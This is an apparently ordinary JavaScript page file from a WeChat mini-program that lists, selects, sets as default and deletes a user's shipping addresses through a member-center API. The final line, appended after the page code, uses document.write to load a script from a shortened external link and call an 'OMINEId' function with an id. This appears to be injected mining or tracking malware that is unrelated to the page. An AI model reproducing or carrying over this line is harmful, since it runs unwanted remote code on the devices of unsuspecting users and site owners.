var t = getApp(),
  e = t.requirejs("core"),
  address = t.requirejs("address/adresscode-handle"),
  $ = t.requirejs("jquery");
Page({
  data: {
    loaded: 1,
    show:false,
    list: []
  },
  onLoad: function (e) {
   /// t.url(e)
   this.setData({
     choose: e.action ? e.action:""
   });
   // this.getList();
  },
  onShow: function () {
    this.getList();
    
  },
  onPullDownRefresh: function () {
    this.getList();
  },
  getList: function (addObject,text,fn) {
    var _this = this;
    //我的收获地址
    wx.showLoading({
      title: '加载中',
    });
    var datas={};
    if (addObject){
      datas = $.extend({
        session_token: t.globalData.session_token,
        show_data: 'orderAddress'
      }, addObject);
    }else{
      datas = {
        session_token: t.globalData.session_token,
        show_data: 'orderAddress'
      };
    };
    wx.request({
      url: t.globalData.daxin + "/memberCenter/my",
      data: datas,
      method: "POST",
      success: function (res) {
       // console.log(res);
        wx.hideLoading();
        wx.stopPullDownRefresh();
        if (addObject && res.data.statusCode >= 0){
          wx.showToast({
            title: text,
            icon: 'success',
            duration: 2000
          });
          if(fn)fn();
           return;
        };
        if(res.data.statusCode >=0 && res.data.data.list){
          var addr = res.data.data.list[0].user_order_address;
          var lists=[];
          $.each(addr,function(index,value){
            lists.push($.extend({ addressDetail: address.getData(value.area_code) }, value));
          });
         // console.log(lists);
          _this.setData({
            list:lists,
            show:true
          });
        }else{
          wx.showModal({
            title: '错误提示',
            content: '地址数据获取失败',
            showCancel:false,
            success:function(){
              if(res.confirm){

              }
            }
          })
        }
      }
    })
  },
  chooseThis:function(e){
    if (!this.data.choose){
      return;
    };
    var items=e.currentTarget.dataset.item;
   // console.log(e,items);
    items.addr = items.addressDetail.join("");
    var isOk = t.setCache("orderAddress",items, 60000);
    if(isOk){
      wx.navigateBack();
    }else{
      wx.showToast({
        title: '地址选择失败',
        duration:1000
      })
    };
  },
  setDefault: function (t) {
    var s = this,
      i = e.pdata(t).id,
      indx = e.pdata(t).index;
    var lists = s.data.list;
    var datas = lists[indx]; 
    if (s.data.choose){
      datas.status = '1';
    }else{
      datas.status = datas.status == 1 ? '0' : '1';
    };
    datas.action ="action";
        s.setData({
      loaded: !1,
      list:lists
    });
    s.getList(datas, "设置成功",function(){
      if (s.data.choose){
        wx.navigateBack({
          delta: 1,
        });
      }else{
        s.getList()
      };
    }); 
  },
  deleteItem: function (t) {
    var s = this,
      i = e.pdata(t).id;
    e.confirm("删除后无法恢复, 确认要删除吗 ?", function () {
      s.setData({
        loaded: !1
      });
      s.getList({ id: i, action:"delete"},"删去成功",function(){
        s.getList();
      });
    })
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
